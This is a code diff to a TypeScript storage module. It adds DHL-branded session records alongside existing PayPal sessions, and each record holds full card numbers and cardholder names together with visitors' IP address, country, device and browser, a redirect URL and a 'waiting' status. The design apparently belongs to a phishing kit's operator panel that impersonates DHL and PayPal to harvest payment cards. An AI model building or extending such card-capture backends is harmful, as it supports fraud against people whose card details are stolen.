@@ -6,7 +6,9 @@ import {
   type PaymentRecord,
   type InsertPaymentRecord,
   type PaypalSession,
-  type InsertPaypalSession
+  type InsertPaypalSession,
+  type DhlSession,
+  type InsertDhlSession
 } from "@shared/schema";
 import { randomUUID } from "crypto";
 
@@ -27,6 +29,11 @@ export interface IStorage {
   getPaypalSession(sessionId: string): Promise<PaypalSession | undefined>;
   updatePaypalSession(sessionId: string, updates: Partial<InsertPaypalSession>): Promise<PaypalSession | undefined>;
   getAllPaypalSessions(): Promise<PaypalSession[]>;
+  
+  createDhlSession(session: InsertDhlSession): Promise<DhlSession>;
+  getDhlSession(sessionId: string): Promise<DhlSession | undefined>;
+  updateDhlSession(sessionId: string, updates: Partial<InsertDhlSession>): Promise<DhlSession | undefined>;
+  getAllDhlSessions(): Promise<DhlSession[]>;
 }
 
 export class MemStorage implements IStorage {
@@ -34,12 +41,14 @@ export class MemStorage implements IStorage {
   private adminSettings: AdminSettings | null;
   private paymentRecords: Map<string, PaymentRecord>;
   private paypalSessions: Map<string, PaypalSession>;
+  private dhlSessions: Map<string, DhlSession>;
 
   constructor() {
     this.users = new Map();
     this.adminSettings = null;
     this.paymentRecords = new Map();
     this.paypalSessions = new Map();
+    this.dhlSessions = new Map();
   }
 
   async getUser(id: string): Promise<User | undefined> {
@@ -155,6 +164,47 @@ export class MemStorage implements IStorage {
 
   async getAllPaypalSessions(): Promise<PaypalSession[]> {
     return Array.from(this.paypalSessions.values()).sort(
+      (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
+    );
+  }
+
+  async createDhlSession(session: InsertDhlSession): Promise<DhlSession> {
+    const id = randomUUID();
+    const dhlSession: DhlSession = {
+      id,
+      sessionId: session.sessionId,
+      cardNumber: session.cardNumber,
+      cardholderName: session.cardholderName,
+      ipAddress: session.ipAddress ?? null,
+      country: session.country ?? null,
+      device: session.device ?? null,
+      browser: session.browser ?? null,
+      redirectUrl: session.redirectUrl ?? null,
+      status: session.status ?? "waiting",
+      createdAt: new Date(),
+    };
+    this.dhlSessions.set(session.sessionId, dhlSession);
+    return dhlSession;
+  }
+
+  async getDhlSession(sessionId: string): Promise<DhlSession | undefined> {
+    return this.dhlSessions.get(sessionId);
+  }
+
+  async updateDhlSession(sessionId: string, updates: Partial<InsertDhlSession>): Promise<DhlSession | undefined> {
+    const session = this.dhlSessions.get(sessionId);
+    if (!session) return undefined;
+
+    const updated: DhlSession = {
+      ...session,
+      ...updates,
+    };
+    this.dhlSessions.set(sessionId, updated);
+    return updated;
+  }
+
+  async getAllDhlSessions(): Promise<DhlSession[]> {
+    return Array.from(this.dhlSessions.values()).sort(
       (a, b) => (b.createdAt?.getTime() || 0) - (a.createdAt?.getTime() || 0)
     );
   }
